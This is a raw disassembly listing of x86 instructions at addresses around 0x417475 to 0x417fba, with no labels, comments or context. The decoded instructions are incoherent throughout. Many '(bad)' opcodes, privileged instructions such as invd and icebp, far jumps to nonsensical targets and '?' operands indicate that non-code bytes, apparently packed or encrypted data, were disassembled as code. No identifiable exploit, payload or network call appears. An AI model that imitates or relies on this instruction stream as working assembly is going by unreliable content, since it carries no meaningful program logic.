  417475:	sub    dh,BYTE PTR [esi+0x189379a7]
  41747b:	stc    
  41747c:	or     DWORD PTR [ebx],ebx
  41747e:	cs pop esi
  417480:	cmp    DWORD PTR [edx+0x184da87a],edx
  417486:	mov    esp,0x90b96830
  41748b:	pop    ecx
  41748c:	cmp    ah,BYTE PTR [edx]
  41748e:	(bad)  
  41748f:	xchg   ebp,eax
  417490:	enter  0x1268,0x93
  417494:	inc    ebp
  417495:	cwde   
  417496:	inc    ebx
  417497:	fcom   DWORD PTR [esi-0xcd279b9]
  41749d:	test   edi,eax
  41749f:	into   
  4174a0:	or     ebx,DWORD PTR [edx+0x4f7ecf56]
  4174a6:	and    edi,eax
  4174a8:	xchg   ebp,eax
  4174a9:	repnz and BYTE PTR [edi],0x87
  4174ad:	dec    edx
  4174ae:	adc    BYTE PTR [ebp-0x3],bh
  4174b1:	jl     0x417436
  4174b3:	or     eax,0xc23db42f
  4174b8:	imul   ecx,DWORD PTR [eax+0x582e80f7],0x6b6058d8
  4174c2:	mov    cl,0x7e
  4174c4:	or     BYTE PTR [esi+0x7b29c91f],bl
  4174ca:	into   
  4174cb:	out    0x83,eax
  4174cd:	aaa    
  4174ce:	pushf  
  4174cf:	dec    ebx
  4174d0:	(bad)  
  4174d1:	retf   
  4174d2:	cmp    al,0x58
  4174d4:	or     DWORD PTR [eax-0xa],0x36
  4174d8:	ret    0x97
	...
  4176ab:	add    BYTE PTR [eax],al
  4176ad:	add    BYTE PTR [edi-0x126a5a8a],bh
  4176b3:	xlat   BYTE PTR ds:[ebx]
  4176b4:	mov    edi,0xa0a36c7e
  4176b9:	shr    BYTE PTR [ebp-0x509e7ee2],0xf7
  4176c0:	add    DWORD PTR [eax],eax
  4176c2:	and    al,BYTE PTR [edi]
  4176c4:	add    BYTE PTR [eax],al
  4176c6:	jbe    0x417709
  4176c8:	and    edx,ecx
  4176ca:	cmc    
  4176cb:	lods   eax,DWORD PTR ds:[esi]
  4176cc:	adc    al,0x9e
  4176ce:	jae    0xacb7824b
  4176d4:	cmp    DWORD PTR [esi],ebx
  4176d6:	mov    esp,0xcbe60198
  4176db:	clc    
  4176dc:	sti    
  4176dd:	sub    esi,DWORD PTR [ecx+0x6ff0917c]
  4176e3:	iret   
  4176e4:	xor    dh,BYTE PTR [esp+ecx*1]
  4176e7:	dec    esi
  4176e8:	stos   BYTE PTR es:[edi],al
  4176e9:	nop
  4176ea:	pop    ecx
  4176eb:	icebp  
  4176ec:	ins    DWORD PTR es:[edi],dx
  4176ed:	pop    DWORD PTR [ebp-0x3b]
  4176f0:	cmp    bl,BYTE PTR [edi-0x70c6e8f4]
  4176f6:	scas   al,BYTE PTR es:[edi]
  4176f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176f8:	adc    dh,BYTE PTR [edx+0x3d]
  4176fb:	test   esi,edx
  4176fd:	std    
  4176fe:	mov    ebx,0x28fb8672
  417703:	mov    dl,0xf5
  417705:	mov    eax,0x479268de
  41770a:	pop    eax
  41770b:	(bad)  
  41770c:	xchg   edi,eax
  41770d:	mov    ch,0x48
  41770f:	jo     0x417712
  417711:	aaa    
  417712:	xchg   ebp,eax
  417713:	xchg   edx,eax
  417714:	std    
  417715:	inc    esp
  417716:	or     DWORD PTR [eax],edi
  417718:	shl    DWORD PTR [ecx-0x56],0x6c
  41771c:	int    0x77
  41771e:	and    eax,0xdd84fec3
  417723:	leave  
  417724:	daa    
  417725:	xchg   dl,ah
  417727:	jmp    0xeeabbb64
  41772c:	das    
  41772d:	loope  0x4177aa
  41772f:	dec    edx
  417730:	(bad)  
  417731:	adc    DWORD PTR [ebx],esi
  417733:	mov    cl,0x7f
  417735:	clc    
  417736:	das    
  417737:	aam    0x50
  417739:	pop    ebp
  41773a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41773b:	jge    0x417712
  41773d:	jb     0x417787
  41773f:	or     DWORD PTR [edx+0x1a69a11e],edi
  417745:	cld    
  417746:	mov    ebx,DWORD PTR [eax-0x43]
  417749:	sar    al,cl
  41774b:	ret    0x9128
  41774e:	setb   BYTE PTR [edx-0x79]
  417752:	nop
  417753:	aam    0x3b
  417755:	xchg   edx,eax
  417756:	lea    esp,ds:0xe8ecc55b
  41775c:	test   DWORD PTR [eax],ecx
  41775e:	test   DWORD PTR [eax+0x24],esi
  417761:	push   ecx
  417762:	ss jb  0x417783
  417765:	loopne 0x4176f7
  417767:	mov    dl,0xc4
  417769:	das    
  41776a:	pop    ss
  41776b:	pushw  0x1c
  41776e:	mov    ch,0xdf
  417770:	xor    esi,DWORD PTR [esi-0x78ea6d27]
  417776:	test   BYTE PTR [esi-0x68],al
  417779:	ror    DWORD PTR [esi+0x2637b9f4],1
  41777f:	or     esi,DWORD PTR [eax+edx*4-0x63]
  417783:	icebp  
  417784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417785:	(bad)  
  417786:	sub    DWORD PTR [ecx+edi*4-0x7c18ef92],edi
  41778d:	jmp    0xf2a7:0x9b4f5ad2
  417794:	fstp   QWORD PTR [ecx+0x0]
  417797:	push   ds
  417798:	fidivr DWORD PTR [edx+0x7]
  41779b:	and    eax,0xc908fba3
  4177a0:	sbb    edx,eax
  4177a2:	cmc    
  4177a3:	or     dh,BYTE PTR [ebx-0x34]
  4177a6:	add    BYTE PTR [esi],al
  4177a8:	pop    esp
  4177a9:	jg     0x417789
  4177ab:	lods   al,BYTE PTR ds:[esi]
  4177ac:	out    dx,al
  4177ad:	popa   
  4177ae:	mov    dl,0x8
  4177b0:	jge    0x417779
  4177b2:	and    esp,DWORD PTR [eax+0x50]
  4177b5:	pop    ds
  4177b6:	sbb    al,0xb2
  4177b8:	(bad)  
  4177b9:	out    0x74,eax
  4177bb:	call   0xbcf2:0x3b69844a
  4177c2:	movzx  ecx,BYTE PTR [ecx]
  4177c5:	jns    0x41783a
  4177c7:	xchg   BYTE PTR [eax],al
  4177c9:	xor    bl,dl
  4177cb:	pop    ds
  4177cc:	ret    0xae59
  4177cf:	jns    0x417797
  4177d1:	jmp    0x4177ba
  4177d3:	dec    ecx
  4177d4:	scas   al,BYTE PTR es:[edi]
  4177d5:	dec    eax
  4177d6:	ins    BYTE PTR es:[edi],dx
  4177d7:	mov    cl,0x47
  4177d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177da:	outs   dx,BYTE PTR ds:[esi]
  4177db:	test   al,0xde
  4177dd:	mov    WORD PTR [ecx-0x270f0ead],?
  4177e3:	xchg   ebp,eax
  4177e4:	aas    
  4177e5:	les    ebx,FWORD PTR [ecx]
  4177e7:	fs xor eax,0x823916c5
  4177ed:	push   ss
  4177ee:	es cmp ch,bl
  4177f1:	dec    esp
  4177f2:	popa   
  4177f3:	aam    0xd8
  4177f5:	(bad)  [edx]
  4177f7:	outs   dx,DWORD PTR ds:[esi]
  4177f8:	cmp    eax,0x379028f0
  4177fd:	ror    DWORD PTR [ebx+0x1008c4f8],1
  417803:	rcl    BYTE PTR [ebp+ebp*1-0x16],1
  417807:	jl     0x41778a
  417809:	scas   al,BYTE PTR es:[edi]
  41780a:	mov    DWORD PTR [eax+0x15],esp
  41780d:	adc    eax,0x4fa1589f
  417812:	mov    edx,0x7ebefcbf
  417817:	pop    eax
  417818:	mov    eax,0x3125d334
  41781d:	xchg   edx,eax
  41781e:	xor    al,0x26
  417820:	cdq    
  417821:	jnp    0x4177e0
  417823:	cs sahf 
  417825:	mov    bl,0x6d
  417827:	(bad)  
  417829:	mov    ds:0x5ddb7c68,al
  41782e:	push   ds
  41782f:	loopne 0x4177fe
  417831:	not    BYTE PTR [edx-0x4d4d8e42]
  417837:	arpl   WORD PTR [esi+0x254c48a4],sp
  41783d:	outs   dx,BYTE PTR ds:[esi]
  41783f:	das    
  417840:	push   es
  417841:	int3   
  417842:	retf   0x2b21
  417845:	mov    cs,WORD PTR [ecx+esi*8+0x1]
  417849:	out    dx,al
  41784a:	pop    ecx
  41784b:	dec    ecx
  41784c:	rcr    BYTE PTR [esi+edx*2],0x17
  417850:	and    bl,BYTE PTR [edx]
  417852:	hlt    
  417853:	pop    ebp
  417854:	mov    al,bh
  417856:	rcr    DWORD PTR [edx],1
  417858:	loopne 0x417840
  41785a:	fld    QWORD PTR [esp+ebp*4-0x35]
  41785e:	jb     0x4178c8
  417860:	or     edx,DWORD PTR [esi]
  417862:	test   ch,ah
  417864:	mov    ecx,ds
  417866:	ja     0x4178d4
  417868:	cmp    eax,0x1b6dd480
  41786d:	or     al,0x78
  41786f:	inc    esp
  417870:	nop
  417871:	adc    DWORD PTR [ebp-0x1c31467a],esi
  417877:	mov    ebp,0xbebd1821
  41787c:	leave  
  41787d:	retf   0xeca6
  417880:	scas   al,BYTE PTR es:[edi]
  417881:	iret   
  417882:	mov    ch,0x48
  417884:	rcr    ecx,cl
  417886:	and    bl,BYTE PTR [ebx-0x3c]
  417889:	sub    eax,DWORD PTR [edx+0x3d339f8b]
  41788f:	std    
  417890:	pop    eax
  417891:	jecxz  0x417894
  417893:	sub    eax,0x75711495
  417898:	int3   
  417899:	push   edi
  41789a:	test   eax,0x3cac66c1
  41789f:	dec    esp
  4178a0:	push   ebp
  4178a1:	shr    ah,cl
  4178a3:	shl    DWORD PTR [eax-0x50bc83b9],1
  4178a9:	fstenv [edx]
  4178ac:	int3   
  4178ad:	aaa    
  4178ae:	cmp    eax,0x43cffd5b
  4178b3:	cli    
  4178b4:	and    eax,0xbfcbe658
  4178b9:	mov    bh,0x1f
  4178bb:	js     0x417921
  4178bd:	sub    esi,DWORD PTR [esi]
  4178bf:	jl     0x4178f0
  4178c1:	nop
  4178c2:	jg     0x41784f
  4178c4:	push   cs
  4178c5:	fsubr  DWORD PTR [eax+0x71]
  4178c8:	dec    esp
  4178c9:	jno    0x417932
  4178cb:	jns    0x4178f6
  4178cd:	aas    
  4178ce:	push   edx
  4178cf:	imul   ecx,DWORD PTR [edx+0x6c],0xf18cb985
  4178d6:	ss push edx
  4178d8:	dec    ebp
  4178d9:	enter  0x395c,0xf5
  4178dd:	(bad)  
  4178de:	lods   eax,DWORD PTR ds:[esi]
  4178df:	jns    0x417953
  4178e1:	in     eax,dx
  4178e2:	das    
  4178e3:	lods   eax,DWORD PTR ds:[esi]
  4178e4:	jmp    DWORD PTR [eax+0x7f87e682]
  4178ea:	out    0x24,al
  4178ec:	and    BYTE PTR [esi-0x6051e8e2],dh
  4178f2:	cmc    
  4178f3:	cmp    BYTE PTR [esi+0x531905af],dh
  4178f9:	imul   esp,edi,0xfffffff4
  4178fc:	dec    edi
  4178fd:	lods   eax,DWORD PTR ds:[esi]
  4178fe:	cmp    eax,edx
  417900:	mov    ds:0xb006b88f,al
  417905:	sbb    al,0xb4
  417907:	push   esi
  417908:	test   eax,0xb5035c74
  41790d:	cmp    esp,DWORD PTR [edi-0x1180dc5]
  417913:	or     eax,0x7d75fec4
  417918:	bswap  edx
  41791a:	lds    ebx,FWORD PTR [ecx+0xc]
  41791d:	jmp    0x41482c88
  417922:	test   eax,0x79fc6002
  417927:	leave  
  417928:	mov    esp,0xc8cd3d78
  41792d:	adc    BYTE PTR ds:0x331e,al
  417932:	mov    bh,0xdc
  417934:	call   0xa3b7:0xafe41472
  41793b:	arpl   WORD PTR [edi-0x4e8afcec],di
  417941:	pop    esp
  417942:	cs mov eax,0xd59a5fc2
  417948:	and    edi,ebx
  41794a:	outs   dx,DWORD PTR ds:[esi]
  41794b:	rcl    BYTE PTR [ecx],0x3b
  41794e:	hlt    
  41794f:	ret    0xf0de
  417952:	dec    ebx
  417953:	(bad)
  417956:	dec    ecx
  417957:	lock dec BYTE PTR [esi-0x48]
  41795b:	mov    ch,0x4c
  41795d:	outs   dx,DWORD PTR ds:[esi]
  41795e:	or     eax,0x6d694e53
  417963:	fwait
  417964:	push   ds
  417965:	sbb    BYTE PTR [esi-0x19],bh
  417968:	lock jmp 0xfbe7:0xf9b14f8c
  417970:	xchg   ebp,eax
  417971:	retf   
  417972:	mov    ch,0x11
  417974:	adc    BYTE PTR [esp+esi*2],0xd8
  417978:	push   es
  417979:	xchg   DWORD PTR es:[esi],eax
  41797c:	sub    DWORD PTR [edi-0x51b751cb],ebx
  417982:	nop
  417983:	sbb    edi,eax
  417985:	dec    edi
  417986:	ror    BYTE PTR [ecx],cl
  417988:	mov    ds:0x7f7f8c9,al
  41798d:	aaa    
  41798e:	mov    eax,0xc172c114
  417993:	jg     0x4179c2
  417995:	sub    eax,0x969fedce
  41799a:	sub    al,0xb5
  41799c:	out    0x94,al
  41799e:	ret    0x5952
  4179a1:	stos   DWORD PTR es:[edi],eax
  4179a2:	inc    ebx
  4179a3:	aam    0x32
  4179a5:	aaa    
  4179a6:	jle    0x417989
  4179a8:	xor    DWORD PTR [eax+ebp*2],0x16ebe6a
  4179af:	pop    edi
  4179b0:	dec    edi
  4179b1:	push   cs
  4179b2:	rcr    DWORD PTR [ecx+0x29],1
  4179b5:	sbb    ch,BYTE PTR [ecx+esi*2+0x71622d16]
  4179bc:	(bad)  
  4179bd:	sbb    BYTE PTR [edx-0x4830e4cd],bl
  4179c3:	fwait
  4179c4:	pop    ebp
  4179c5:	cmc    
  4179c6:	fwait
  4179c7:	inc    ebp
  4179c8:	pop    esi
  4179c9:	jecxz  0x4179cc
  4179cb:	pop    ds
  4179cc:	(bad)  
  4179cd:	retf   
  4179ce:	add    DWORD PTR [edx+ebp*1-0x488c28ff],0x29
  4179d6:	xchg   BYTE PTR [ebp-0x3724607a],ch
  4179dc:	cmp    eax,0x29a5ba8f
  4179e1:	push   edi
  4179e2:	jno    0x4179d9
  4179e4:	psubw  mm7,QWORD PTR fs:[ebp-0x74]
  4179e9:	mov    ch,0x19
  4179eb:	std    
  4179ec:	stos   BYTE PTR es:[edi],al
  4179ed:	xchg   ebx,eax
  4179ee:	pusha  
  4179ef:	push   ebp
  4179f0:	lods   al,BYTE PTR ds:[esi]
  4179f1:	add    eax,0xf59b3aa
  4179f6:	loope  0x41799e
  4179f8:	and    eax,DWORD PTR [ecx-0x18d9e184]
  4179fe:	fisttp QWORD PTR [ebx]
  417a00:	jo     0x417a4a
  417a02:	idiv   DWORD PTR [ebx]
  417a04:	xor    al,BYTE PTR [ebp+0x7f]
  417a07:	mov    eax,ds:0xebe08995
  417a0c:	pop    ecx
  417a0d:	in     eax,dx
  417a0e:	inc    ebx
  417a0f:	pop    edi
  417a10:	and    dh,BYTE PTR [edi]
  417a12:	je     0x4179f5
  417a14:	lds    edx,FWORD PTR [ebx]
  417a16:	jecxz  0x417a56
  417a18:	dec    esi
  417a19:	enter  0x776c,0xc2
  417a1d:	mov    al,0x89
  417a1f:	cmp    DWORD PTR [edx-0x3a],0xd4f38666
  417a26:	lahf   
  417a27:	ja     0x417a93
  417a29:	push   0xcaa7c859
  417a2e:	dec    ebx
  417a2f:	mov    ds:0x3ca89534,eax
  417a34:	neg    BYTE PTR [ebx*8+0x1db0dcb0]
  417a3b:	mov    dh,cl
  417a3d:	fadd   st,st(4)
  417a3f:	out    0x7e,al
  417a41:	mov    bl,0xb1
  417a43:	and    al,0xb2
  417a45:	pusha  
  417a46:	dec    ecx
  417a47:	mov    esi,0x7a77ea97
  417a4c:	push   cs
  417a4d:	pop    ss
  417a4e:	mov    al,0xb3
  417a50:	fdivr  st,st(6)
  417a52:	shr    DWORD PTR [edi+0x63],1
  417a55:	jno    0x4179df
  417a57:	jnp    0x417a2f
  417a59:	xor    DWORD PTR [edx+0x3582d96d],eax
  417a5f:	ins    DWORD PTR es:[edi],dx
  417a60:	(bad)  [ebx]
  417a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a63:	ins    DWORD PTR es:[edi],dx
  417a64:	ret    0x6b23
  417a67:	daa    
  417a68:	inc    edx
  417a69:	inc    edi
  417a6a:	gs mov ebx,0x855122eb
  417a70:	(bad)  
  417a71:	les    esi,FWORD PTR [edi-0x39]
  417a74:	in     eax,dx
  417a75:	sbb    BYTE PTR [edi-0x72],ch
  417a78:	out    dx,al
  417a79:	fs ins BYTE PTR es:[edi],dx
  417a7b:	sti    
  417a7c:	ja     0x417afc
  417a7e:	iret   
  417a7f:	sub    BYTE PTR [ebx+0x721a7217],bh
  417a85:	mov    BYTE PTR [ecx],ch
  417a87:	repz pop ebx
  417a89:	dec    esp
  417a8a:	aam    0x67
  417a8c:	(bad)
  417a8f:	fbstp  TBYTE PTR [ebx+0x71]
  417a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a93:	mov    ebp,0xe0fa0749
  417a98:	ins    BYTE PTR es:[edi],dx
  417a99:	pop    ds
  417a9a:	das    
  417a9b:	and    eax,esi
  417a9d:	or     BYTE PTR [ecx+0x1f],0xd0
  417aa1:	add    DWORD PTR [ebp-0x1726b3f3],eax
  417aa7:	xchg   ebx,eax
  417aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aa9:	or     bh,BYTE PTR [ebp-0x71]
  417aac:	add    DWORD PTR [eax],esp
  417aae:	cld    
  417aaf:	xchg   ebp,eax
  417ab0:	mov    eax,0x95f55bef
  417ab5:	repz dec eax
  417ab7:	xchg   ebx,eax
  417ab8:	dec    esp
  417ab9:	adc    BYTE PTR [edx-0x56],0xc8
  417abd:	stos   DWORD PTR es:[edi],eax
  417abe:	in     eax,dx
  417abf:	jmp    0x417ad3
  417ac1:	add    DWORD PTR [esi+0x39],0x6f
  417ac5:	inc    edi
  417ac6:	mov    ecx,0x6d2d6bbf
  417acb:	test   al,0x5a
  417acd:	sbb    ch,BYTE PTR [edx+0x1229ecfa]
  417ad3:	pop    ebp
  417ad4:	xchg   ecx,eax
  417ad5:	jmp    0x8c1a:0x20e576c2
  417adc:	jl     0x417b55
  417ade:	fsubr  st,st(3)
  417ae0:	mov    ch,0x53
  417ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae3:	fisub  WORD PTR [esi+0x5940d7d7]
  417ae9:	xor    ebx,DWORD PTR [ebx-0x71bdc4b6]
  417aef:	int    0x80
  417af1:	icebp  
  417af2:	std    
  417af3:	test   BYTE PTR [eax-0x6f],ah
  417af6:	inc    esi
  417af7:	jmp    0x3455:0x6d65c811
  417afe:	mov    ds:0xc52dd5cc,al
  417b03:	nop
  417b04:	repz jmp 0xb1d7cb02
  417b0a:	inc    edi
  417b0b:	inc    edx
  417b0c:	adc    DWORD PTR [ecx-0x17],eax
  417b0f:	or     eax,0xe70e098
  417b14:	push   esp
  417b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b16:	and    al,0x21
  417b18:	jl     0x417aea
  417b1a:	sar    BYTE PTR [ecx+0x23fd40be],1
  417b20:	adc    bl,cl
  417b22:	inc    esp
  417b23:	push   eax
  417b24:	(bad)  
  417b27:	imul   edx,DWORD PTR [esi],0x14
  417b2a:	loopne 0x417b30
  417b2c:	add    eax,0x6e2d6477
  417b31:	(bad)  
  417b32:	push   ecx
  417b33:	ins    BYTE PTR es:[edi],dx
  417b34:	sbb    al,0x41
  417b36:	jle    0x417b88
  417b38:	dec    ebp
  417b39:	xor    DWORD PTR [eax],esi
  417b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b3c:	jp     0x417b24
  417b3e:	xor    al,0x44
  417b40:	call   0x6e37:0x51aad7a8
  417b47:	add    eax,0xab583973
  417b4c:	int    0x63
  417b4e:	std    
  417b4f:	imul   edx,DWORD PTR [esi],0xe52dbf45
  417b55:	mov    dl,0xc0
  417b57:	sbb    al,0xba
  417b59:	ret    0xf75a
  417b5c:	jmp    0xbc22:0xe0f2d25a
  417b63:	or     bl,ch
  417b65:	and    DWORD PTR [eax-0x715a992d],0xfffffffb
  417b6c:	invd   
  417b6e:	mov    al,0xff
  417b70:	xchg   ecx,eax
  417b71:	int    0x37
  417b73:	test   DWORD PTR [eax+0x344ab7a],0x9b34aedb
  417b7d:	stos   DWORD PTR es:[edi],eax
  417b7e:	xchg   edx,eax
  417b7f:	js     0x417b38
  417b81:	mov    ebp,0x12ce070a
  417b86:	or     DWORD PTR [eax+0x603d8b39],ebx
  417b8c:	adc    DWORD PTR [ebp+0x1dd9e4e1],0x44
  417b93:	sbb    eax,0xeebfb9d2
  417b98:	and    bh,BYTE PTR [edx+edi*2-0x4bacc47f]
  417b9f:	nop
  417ba0:	xchg   edx,eax
  417ba1:	paddsw mm3,QWORD PTR [ecx-0x3]
  417ba5:	jne    0x417bb4
  417ba7:	in     al,0xd2
  417ba9:	adc    eax,0xf23439ce
  417bae:	cwde   
  417baf:	sbb    al,0x91
  417bb1:	xchg   BYTE PTR [ebp-0x72b7cc9a],bh
  417bb7:	sti    
  417bb8:	ins    BYTE PTR es:[edi],dx
  417bb9:	int    0xb9
  417bbb:	das    
  417bbc:	jle    0x417bbc
  417bbe:	xchg   esp,eax
  417bbf:	mov    ds:0x8ce0e1a4,al
  417bc4:	call   0x5860:0x949f67e0
  417bcb:	push   ecx
  417bcc:	imul   eax,DWORD PTR [edi],0xffffffc2
  417bcf:	(bad)  
  417bd0:	rcl    bh,cl
  417bd2:	test   DWORD PTR [ebx],esp
  417bd4:	sbb    edi,DWORD PTR es:[edx+0x6e1a1ccf]
  417bdb:	imul   ecx,DWORD PTR [ecx+0x12d15bef],0x43
  417be2:	xor    eax,0x1cc848
  417be7:	cmp    eax,0xf81baf55
  417bec:	sbb    ah,ah
  417bee:	pop    es
  417bef:	push   esp
  417bf0:	div    DWORD PTR [edi]
  417bf2:	(bad)  
  417bf3:	pop    ebx
  417bf4:	jno    0x417bc1
  417bf6:	in     al,0xd1
  417bf8:	xchg   esp,eax
  417bf9:	ret    0x3282
  417bfc:	sub    dh,BYTE PTR [ebp-0x3]
  417bff:	sbb    cl,cl
  417c01:	call   0x872a:0xad39c632
  417c08:	shl    BYTE PTR [edi+0x1d],1
  417c0b:	(bad)  [eax]
  417c0d:	imul   esp,ecx,0x17
  417c10:	xchg   ebx,eax
  417c11:	add    bh,bl
  417c13:	or     DWORD PTR [ebp-0x7124540c],edi
  417c19:	mov    edx,0x3c099fdb
  417c1e:	sbb    BYTE PTR [eax+0x15],dh
  417c21:	mov    cl,0x5a
  417c23:	test   BYTE PTR [eax-0x133ac1ac],ch
  417c29:	inc    ecx
  417c2a:	sbb    bl,BYTE PTR [edi+0x4ab0a743]
  417c30:	add    esi,eax
  417c32:	mov    BYTE PTR [ecx+0x1a865a8f],ch
  417c38:	shl    BYTE PTR [ebx],0x2f
  417c3b:	sub    BYTE PTR [ecx+0x61],bh
  417c3e:	jmp    0x2f98:0xca272fb5
  417c45:	pop    edx
  417c46:	aaa    
  417c47:	sub    DWORD PTR [edi],edi
  417c49:	aas    
  417c4a:	xor    BYTE PTR [edi+0x69],0xdb
  417c4e:	dec    ebx
  417c4f:	mov    dh,0xc7
  417c51:	repnz les eax,FWORD PTR [esi+0x28109e09]
  417c58:	pop    ecx
  417c59:	stos   DWORD PTR es:[edi],eax
  417c5a:	adc    DWORD PTR ds:0x8bbe2256,edx
  417c60:	jae    0x417cc8
  417c62:	call   0xdd8e:0x19534d0a
  417c69:	scas   al,BYTE PTR es:[edi]
  417c6a:	xchg   edx,eax
  417c6b:	jns    0x417c1b
  417c6d:	mov    ?,WORD PTR [ebp+0x14]
  417c70:	jp     0x417c57
  417c72:	fwait
  417c73:	aad    0x54
  417c75:	dec    edi
  417c76:	push   ss
  417c77:	leave  
  417c78:	stos   DWORD PTR es:[edi],eax
  417c79:	daa    
  417c7a:	test   edi,edx
  417c7c:	sbb    al,0x5f
  417c7e:	xchg   esi,eax
  417c7f:	push   eax
  417c80:	js     0x417c6c
  417c82:	xor    al,0xbf
  417c84:	cwde   
  417c85:	push   eax
  417c86:	iret   
  417c87:	sub    dh,BYTE PTR [esi+0x3dacb93d]
  417c8d:	cmp    BYTE PTR ds:0x7d41df3a,bl
  417c93:	inc    ebp
  417c94:	ins    DWORD PTR es:[edi],dx
  417c95:	push   esp
  417c96:	or     al,0x6
  417c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c99:	adc    ebp,DWORD PTR [ebx]
  417c9b:	cmp    ebp,DWORD PTR [ebx-0x4a]
  417c9e:	outs   dx,BYTE PTR ds:[esi]
  417c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ca0:	mov    ebp,0x2767f649
  417ca5:	je     0x417c6b
  417ca7:	mov    ebp,0x3818864
  417cac:	cli    
  417cad:	xor    BYTE PTR [edx-0x1be18543],bl
  417cb3:	ins    DWORD PTR es:[edi],dx
  417cb4:	mov    DWORD PTR [ebp+0x53],ebx
  417cb7:	enter  0xe3e4,0xea
  417cbb:	jle    0x417ccf
  417cbd:	jbe    0x417c8f
  417cbf:	iret   
  417cc0:	add    eax,0x9fe54894
  417cc5:	sbb    BYTE PTR [edx],bl
  417cc7:	sub    eax,0xae81b778
  417ccc:	add    esi,esp
  417cce:	xchg   esp,eax
  417ccf:	cld    
  417cd0:	pop    es
  417cd1:	ret    
  417cd2:	pop    edi
  417cd3:	dec    ecx
  417cd4:	mov    ebx,0x3e8bcce3
  417cd9:	jge    0x417d01
  417cdb:	pop    edx
  417cdc:	mov    bh,0xc1
  417cde:	sbb    BYTE PTR [eax+0x463a2ce0],0x95
  417ce5:	dec    ecx
  417ce6:	mov    DWORD PTR [edi],edx
  417ce8:	bound  esi,QWORD PTR [ebx+0x58a7c768]
  417cee:	adc    al,BYTE PTR [eax-0x53cdf074]
  417cf4:	outs   dx,BYTE PTR ds:[esi]
  417cf5:	cmp    DWORD PTR [ecx-0x37],esp
  417cf8:	clc    
  417cf9:	jg     0x417d72
  417cfb:	imul   edx,DWORD PTR [ecx+esi*1+0x93db3b6],0xffffffa1
  417d03:	hlt    
  417d04:	mov    cl,0xa1
  417d06:	add    eax,0xc6661fba
  417d0b:	sahf   
  417d0c:	pop    es
  417d0d:	lahf   
  417d0e:	pop    es
  417d0f:	xor    eax,0x536c7b03
  417d14:	outs   dx,BYTE PTR ds:[esi]
  417d16:	pop    ss
  417d17:	fwait
  417d18:	fwait
  417d19:	cdq    
  417d1a:	ds sub edi,edx
  417d1d:	cmp    DWORD PTR [edx+0x53460bbf],esi
  417d23:	or     DWORD PTR [edi],eax
  417d25:	rcl    ebx,1
  417d27:	jmp    0x8924:0xfa66f826
  417d2e:	push   ebx
  417d2f:	in     eax,0xe4
  417d31:	jecxz  0x417ce1
  417d33:	test   al,0xc4
  417d35:	dec    ecx
  417d36:	pop    ds
  417d37:	push   esp
  417d38:	pop    ds
  417d39:	mov    eax,0x94dc4837
  417d3e:	arpl   WORD PTR [ecx+0x3c],ax
  417d41:	sahf   
  417d42:	out    0x14,eax
  417d44:	out    dx,eax
  417d45:	pop    ds
  417d46:	cs hlt 
  417d48:	in     eax,dx
  417d49:	cmp    eax,0x14e8fb6e
  417d4e:	cmc    
  417d4f:	or     DWORD PTR [edx],ebp
  417d51:	ret    
  417d52:	xchg   esi,eax
  417d53:	fwait
  417d54:	push   ebp
  417d55:	and    eax,0xfc0d0cec
  417d5a:	pop    ebx
  417d5b:	or     ebp,eax
  417d5d:	imul   edx,DWORD PTR [esp+ebx*4-0x6],0xffffffdd
  417d62:	xchg   ebp,eax
  417d63:	mov    esp,0xb9e1bf65
  417d68:	outs   dx,BYTE PTR ds:[esi]
  417d6a:	xchg   ecx,eax
  417d6b:	dec    ebp
  417d6c:	and    al,0x84
  417d6e:	xchg   esp,eax
  417d6f:	push   0xfffffff0
  417d71:	xor    al,0x64
  417d73:	add    al,bl
  417d75:	mov    gs,WORD PTR [ebp+edx*4+0x5f]
  417d79:	(bad)  
  417d7a:	mov    bl,BYTE PTR [edx-0x11]
  417d7d:	shl    esp,0x47
  417d80:	pop    esp
  417d81:	xor    ecx,DWORD PTR [eax+eiz*2]
  417d84:	add    al,0x3
  417d86:	pop    esp
  417d87:	sub    dl,dl
  417d89:	sub    bl,BYTE PTR ds:0x91ebfacb
  417d8f:	xchg   ebp,eax
  417d90:	inc    ebx
  417d91:	jg     0x417d51
  417d93:	xchg   ebp,eax
  417d94:	fiadd  WORD PTR [edx+ecx*1-0x7e]
  417d98:	cwde   
  417d99:	test   DWORD PTR [esp+eax*2+0x4b],edx
  417d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d9e:	jne    0x417d48
  417da0:	xor    BYTE PTR [edx],al
  417da2:	sub    BYTE PTR [eax+0x3a8e6a06],0x54
  417da9:	cwde   
  417daa:	inc    edx
  417dab:	cmp    al,BYTE PTR [eax-0x3be0e21b]
  417db1:	into   
  417db2:	push   ss
  417db3:	xchg   edi,eax
  417db4:	ficomp DWORD PTR [ebx+eax*8+0x4c458513]
  417dbb:	push   ebx
  417dbc:	jmp    0x417df4
  417dbe:	gs or  edi,ebx
  417dc1:	add    BYTE PTR [eax],ah
  417dc3:	and    ebx,ebp
  417dc5:	pop    ecx
  417dc6:	pop    ecx
  417dc7:	pop    edx
  417dc8:	xchg   ebp,eax
  417dc9:	retf   0xe903
  417dcc:	test   eax,0x94cdd31a
  417dd1:	loopne 0x417e2e
  417dd3:	adc    esi,DWORD PTR [ebp+0x2d]
  417dd6:	lock push edx
  417dd8:	cwde   
  417dd9:	ret    0x19f6
  417ddc:	mov    ?,WORD PTR [eax]
  417dde:	sbb    al,0x88
  417de0:	adc    DWORD PTR [edx+0x3],ecx
  417de3:	xchg   ecx,eax
  417de4:	jno    0x417df8
  417de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de7:	jns    0x417de9
	...
  417fb5:	add    BYTE PTR [eax],al
  417fb7:	add    BYTE PTR [esi],cl
  417fb9:	pop    esp
  417fba:	mov    esp,0xffe7fe47
